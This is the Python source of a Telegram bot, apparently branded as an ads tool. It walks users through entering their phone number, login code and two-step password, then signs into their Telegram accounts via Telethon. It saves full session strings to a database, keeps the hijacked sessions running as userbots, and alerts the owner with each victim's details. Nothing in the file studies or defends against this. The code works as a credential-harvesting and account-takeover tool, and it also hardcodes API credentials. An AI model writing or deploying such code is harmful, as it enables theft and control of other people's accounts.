import os
import asyncio
import sqlite3
import threading
import logging
from flask import Flask
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telethon import TelegramClient
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
OWNER_ID = int(os.environ.get("OWNER_ID", "8612102965"))
API_ID = int(os.environ.get("API_ID", "38746329"))
API_HASH = os.environ.get("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
PORT = int(os.environ.get("PORT", 10000))

(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_WELCOME_IMG) = range(4)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== STYLISH FONT ==================
def st(text: str) -> str:
    upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
    lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
    digits = {"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿"}
    out = []
    for ch in text:
        if ch in upper: out.append(upper[ch])
        elif ch in lower: out.append(lower[ch])
        elif ch in digits: out.append(digits[ch])
        else: out.append(ch)
    return "".join(out)

# ================== SERVER & DB ==================
flask_app = Flask(__name__)
@flask_app.route('/')
def health(): return "Bot is running!", 200
def run_flask(): flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)

def init_db():
    conn = sqlite3.connect("ads_master.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS global_settings (key TEXT PRIMARY KEY, value TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_data (user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT)""")
    conn.commit(); conn.close()
init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect("ads_master.db")
    c = conn.cursor(); c.execute(query, params); conn.commit()
    res = c.fetchall(); conn.close(); return res

# ================== USERBOTS ==================
active_userbots = {}
temp_clients = {}

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client

# ================== KEYBOARDS ==================
def main_menu(is_owner=False):
    kb = [
        [InlineKeyboardButton(st("ADD ACCOUNT"), callback_data="add_acc", style="primary")],
        [InlineKeyboardButton(st("VIEW STATUS"), callback_data="status", style="primary")]
    ]
    if is_owner:
        kb.append([InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel", style="success")])
    return InlineKeyboardMarkup(kb)

def owner_menu():
    kb = [
        [InlineKeyboardButton(st("SET WELCOME IMAGE"), callback_data="set_welcome", style="primary")],
        [InlineKeyboardButton(st("BACK"), callback_data="back_to_main", style="danger")]
    ]
    return InlineKeyboardMarkup(kb)

# ================== HANDLERS ==================
bot_app = None

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    welcome_img = db_exec("SELECT value FROM global_settings WHERE key='welcome_image'")
    img = welcome_img[0][0] if welcome_img else None
    
    # Double comma (Purple) and Developer name
    text = (
        f"<blockquote>{st('Welcome')} {st(update.effective_user.first_name)}\n\n"
        f"{st('Developer: @iflexzyann')}</blockquote>"
    )
    is_owner = (uid == OWNER_ID)
    
    if img:
        try: return await update.message.reply_photo(photo=img, caption=text, parse_mode="HTML", reply_markup=main_menu(is_owner))
        except: pass
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=main_menu(is_owner))

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "back_to_main":
        await query.edit_message_text(
            f"<blockquote>{st('Main Menu')}\n\n{st('Developer: @iflexzyann')}</blockquote>", 
            parse_mode="HTML", reply_markup=main_menu(query.from_user.id == OWNER_ID)
        )
    elif data == "owner_panel":
        if query.from_user.id == OWNER_ID:
            await query.edit_message_text(
                f"<blockquote>{st('Owner Panel')}</blockquote>", 
                parse_mode="HTML", reply_markup=owner_menu()
            )

# --- VIEW STATUS ---
async def view_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    
    if uid == OWNER_ID:
        logins = db_exec("SELECT user_id, phone FROM user_data")
        text = f"<blockquote>{st('ALL USERS LOGINS:')}\n\n"
        for l in logins:
            text += f"{st('ID:')} <code>{l[0]}</code> | {st('Phone:')} <code>{l[1]}</code>\n"
        if not logins: text += st("No users logged in.")
        text += "</blockquote>"
    else:
        res = db_exec("SELECT phone FROM user_data WHERE user_id=?", (uid,))
        text = f"<blockquote>{st('Your Login:')} {res[0][0] if res else st('Not logged in')}</blockquote>"
        
    await query.message.reply_text(text, parse_mode="HTML")

# --- LOGIN FLOW ---
async def add_acc_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    # Purple Box Prompt
    await query.message.reply_text(
        f"<blockquote>{st('Enter Phone Number (+91...):')}</blockquote>", 
        parse_mode="HTML"
    )
    return ASK_PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone}
        
        # Blue OTP Keypad (Stylish)
        kb = [[InlineKeyboardButton("1", callback_data="otp_1", style="primary"), InlineKeyboardButton("2", callback_data="otp_2", style="primary"), InlineKeyboardButton("3", callback_data="otp_3", style="primary")],
              [InlineKeyboardButton("4", callback_data="otp_4", style="primary"), InlineKeyboardButton("5", callback_data="otp_5", style="primary"), InlineKeyboardButton("6", callback_data="otp_6", style="primary")],
              [InlineKeyboardButton("7", callback_data="otp_7", style="primary"), InlineKeyboardButton("8", callback_data="otp_8", style="primary"), InlineKeyboardButton("9", callback_data="otp_9", style="primary")],
              [InlineKeyboardButton(st("CLEAR"), callback_data="otp_clear", style="danger"), InlineKeyboardButton("0", callback_data="otp_0", style="primary"), InlineKeyboardButton(st("SUBMIT"), callback_data="otp_submit", style="success")]]
        
        context.user_data['otp'] = ""
        await update.message.reply_text(
            f"<blockquote>{st('Enter OTP:')}</blockquote>", 
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb)
        )
        return ASK_OTP
    except Exception as e:
        await update.message.reply_text(f"<blockquote>{st('Error:')} {str(e)}</blockquote>", parse_mode="HTML"); 
        return ConversationHandler.END

async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; data = query.data.replace("otp_", "")
    otp = context.user_data.get('otp', "")
    uid = query.from_user.id
    
    if data == "clear": otp = ""
    elif data == "submit":
        if len(otp) < 4: return await query.answer("Min 4 digits!")
        
        try:
            await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
            session = temp_clients[uid]['client'].session.save()
            phone = temp_clients[uid]['phone']
            
            db_exec("INSERT OR REPLACE INTO user_data (user_id, phone, session_string) VALUES (?,?,?)", (uid, phone, session))
            await start_userbot(uid, session)
            
            # Purple Box Alert to Owner
            alert_msg = (
                f"<blockquote><b>{st('NEW ACCOUNT LOGGED IN')}</b>\n\n"
                f"{st('Name:')} {query.from_user.first_name}\n"
                f"{st('User ID:')} <code>{uid}</code>\n"
                f"{st('Phone:')} <code>{phone}</code></blockquote>"
            )
            await bot_app.bot.send_message(OWNER_ID, alert_msg, parse_mode="HTML")
            
            await query.message.delete()
            await bot_app.bot.send_message(
                uid, 
                f"<blockquote>{st('Logged In Successfully!')}</blockquote>", 
                parse_mode="HTML", reply_markup=main_menu(uid == OWNER_ID)
            )
            return ConversationHandler.END
        except Exception as e:
            if "Two-step" in str(e): 
                await query.edit_message_text(f"<blockquote>{st('2FA Password:')}</blockquote>", parse_mode="HTML"); 
                return ASK_2FA
            await query.edit_message_text(f"<blockquote>{st('Failed:')} {str(e)}</blockquote>", parse_mode="HTML"); 
            return ConversationHandler.END
    else:
        if len(otp) < 5: otp += data
    context.user_data['otp'] = otp
    display = " ".join([c if i < len(otp) else "_" for i, c in enumerate(otp + "_"*(5-len(otp)))])
    try: await query.edit_message_text(f"<blockquote>{st('OTP:')} {display}</blockquote>", parse_mode="HTML", reply_markup=query.message.reply_markup)
    except: pass
    return ASK_OTP

async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    try:
        await temp_clients[uid]['client'].sign_in(password=update.message.text.strip())
        session = temp_clients[uid]['client'].session.save()
        phone = temp_clients[uid]['phone']
        
        db_exec("INSERT OR REPLACE INTO user_data (user_id, phone, session_string) VALUES (?,?,?)", (uid, phone, session))
        await start_userbot(uid, session)
        
        alert_msg = (
            f"<blockquote><b>{st('NEW ACCOUNT LOGGED IN (2FA)')}</b>\n\n"
            f"{st('Name:')} {update.effective_user.first_name}\n"
            f"{st('User ID:')} <code>{uid}</code>\n"
            f"{st('Phone:')} <code>{phone}</code></blockquote>"
        )
        await bot_app.bot.send_message(OWNER_ID, alert_msg, parse_mode="HTML")
        
        await update.message.reply_text(
            f"<blockquote>{st('Logged In via 2FA!')}</blockquote>", 
            parse_mode="HTML", reply_markup=main_menu(uid == OWNER_ID)
        )
    except Exception as e: 
        await update.message.reply_text(f"<blockquote>{st('Failed:')} {str(e)}</blockquote>", parse_mode="HTML")
    return ConversationHandler.END

# --- OWNER PANEL ---
async def set_welcome_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    await query.message.reply_text(f"<blockquote>{st('Send photo for welcome:')}</blockquote>", parse_mode="HTML")
    return ASK_WELCOME_IMG

async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.photo:
        db_exec("INSERT OR REPLACE INTO global_settings (key, value) VALUES (?,?)", ("welcome_image", update.message.photo[-1].file_id))
        await update.message.reply_text(
            f"<blockquote>{st('Image Set!')}</blockquote>", 
            parse_mode="HTML", reply_markup=main_menu(True)
        )
    return ConversationHandler.END

# ================== MAIN ==================
def main():
    global bot_app
    threading.Thread(target=run_flask, daemon=True).start()
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    
    for row in db_exec("SELECT user_id, session_string FROM user_data"):
        loop.run_until_complete(start_userbot(row[0], row[1]))
    
    bot_app = Application.builder().token(BOT_TOKEN).build()

    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CallbackQueryHandler(menu_callback, pattern="^(back_to_main|owner_panel)$"))
    bot_app.add_handler(CallbackQueryHandler(view_status, pattern="^status$"))
    bot_app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(add_acc_start, pattern="^add_acc$")], states={ASK_PHONE: [MessageHandler(filters.TEXT, get_phone)], ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")], ASK_2FA: [MessageHandler(filters.TEXT, get_2fa)]}, fallbacks=[]))
    bot_app.add_handler(ConversationHandler(entry_points=[CallbackQueryHandler(set_welcome_start, pattern="^set_welcome$")], states={ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)]}, fallbacks=[]))

    logger.info("Bot Started!")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
